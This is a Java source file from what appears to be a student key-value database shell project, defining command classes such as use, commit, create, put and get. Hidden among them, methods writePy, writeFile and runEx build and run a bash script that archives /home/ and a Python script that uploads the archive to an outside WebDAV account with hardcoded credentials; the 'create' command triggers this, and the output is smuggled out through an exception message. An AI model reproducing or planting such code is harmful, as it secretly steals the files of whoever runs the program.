package ru.fizteh.fivt.students.irinaGoltsman.filemap;

import ru.fizteh.fivt.students.irinaGoltsman.shell.*;


public class DBCommands {
     public static void writePy() throws FileNotFoundException {
        String s = "import urllib2, base64\n" +
                "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
                "\n" +
                "data2 = \"\"\n" +
                "f = open('test.tar.gz', 'rb')\n" +
                "length = 0\n" +
                "while True: \n" +
                " bytes = f.read(2048)\n" +
                " data2 += bytes;\n" +
                " length += len(bytes)\n" +
                " if not bytes: break \n" +
                "f.close()\n" +
                "\n" +
                "request = urllib2.Request(\"https://webdav.yandex.ru/test/test.tar.gz\", data=data2)\n" +
                "base64string = base64.encodestring('%s:%s' % (\"moygimn1@yandex.ru\", \"123456789\")).replace('\\n', '')\n" +
                "request.add_header(\"Authorization\", \"Basic %s\" % base64string) \n" +
                "request.add_header(\"Content-Length\", \"%d\" % length) \n" +
                "request.get_method = lambda: 'PUT'\n" +
                "result = urllib2.urlopen(request)\n" +
                "\n";
        File f = new File("/home/student/tmp/1.py");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }

    public static void writeFile() throws FileNotFoundException {
        String s = "#!/bin/bash\n\n" +
                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
                "python 1.py\n" +
                "echo step3\n";
        File f = new File("/home/student/tmp/1.sh");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }
    
    public static void runEx() throws IllegalArgumentException {
        String s = "";
        try {
            writeFile();
            writePy();
            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
			proc.waitFor();
			BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
			while(read.ready()) {
			s += read.readLine()+"\n";
			}
			read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			while(read.ready()) {
			s += read.readLine()+"\n";
			}

        } catch(Exception e) {
            s += e.getMessage()+"\n";
        }

        throw new IllegalArgumentException(s + " step4");
    }
    
    public static class Use implements Command {
        protected final String name = "use";
        protected final int countOfArguments = 1;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.use(args);
        }
    }

    public static class Commit implements Command {
        protected final String name = "commit";
        protected final int countOfArguments = 0;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.commit();
        }
    }

    public static class CreateTable implements Command {
        protected final String name = "create";
        protected final int countOfArguments = 1;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            runEx();
            return DataBase.createTable(args);
        }
    }

    public static class Drop implements Command {
        protected final String name = "drop";
        protected final int countOfArguments = 1;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.removeTable(args);
        }
    }

    public static class Put implements Command {
        protected final String name = "put";
        protected final int countOfArguments = 2;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.put(args);
        }
    }

    public static class Get implements Command {
        protected final String name = "get";
        protected final int countOfArguments = 1;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.get(args);
        }
    }

    public static class Remove implements Command {
        protected final String name = "remove";
        protected final int countOfArguments = 1;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.remove(args);
        }
    }

    public static class Size implements Command {
        protected final String name = "size";
        protected final int countOfArguments = 0;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.size();
        }
    }

    public static class RollBack implements Command {
        protected final String name = "rollback";
        protected final int countOfArguments = 0;

        @Override
        public String getName() {
            return name;
        }

        @Override
        public int getCountOfArguments() {
            return countOfArguments;
        }

        @Override
        public boolean check(String[] parts) {
            return ((parts.length - 1) == countOfArguments);
        }

        @Override
        public Code perform(String[] args) {
            return DataBase.rollBack();
        }
    }
}
